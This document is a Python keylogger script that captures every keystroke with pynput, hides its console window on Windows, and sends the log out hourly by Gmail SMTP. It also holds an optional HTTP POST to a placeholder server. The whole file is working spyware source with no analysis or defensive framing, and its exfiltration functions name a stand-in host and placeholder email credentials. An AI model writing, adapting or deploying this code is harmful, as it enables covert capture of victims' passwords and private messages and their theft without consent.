from pynput.keyboard import Listener
import logging
import smtplib
import requests
from datetime import datetime
import os
import threading

# Set up logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log key strokes with timestamp
def log_key(key):
    key_data = str(key).replace("'", "")
    logging.info(key_data)

# Function to hide the console window (Windows only)
def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Function to send log file via HTTP POST to a remote server (optional)
def send_log_http():
    url = "http://your-server.com/receive_log"
    with open(log_file, 'rb') as f:
        requests.post(url, files={'file': f})

# Function to send log file via email (optional)
def send_log_email():
    sender_email = "your_email@gmail.com"
    receiver_email = "receiver_email@gmail.com"
    password = "your_password"

    with open(log_file, 'r') as f:
        message = f"Subject: Keylog Report\n\n{f.read()}"

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        server.quit()
        print("Log sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to start keylogger listener
def start_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

# Function to automate sending log file every 60 minutes (multithreading)
def periodic_log_sender():
    while True:
        threading.Timer(3600, send_log_email).start()  # Sends log every 60 minutes
        threading.Event().wait(3600)  # Wait for 1 hour

# Main execution
if __name__ == "__main__":
    hide_console()  # Hide console on Windows
    threading.Thread(target=periodic_log_sender, daemon=True).start()  # Start periodic log sending
    start_keylogger()
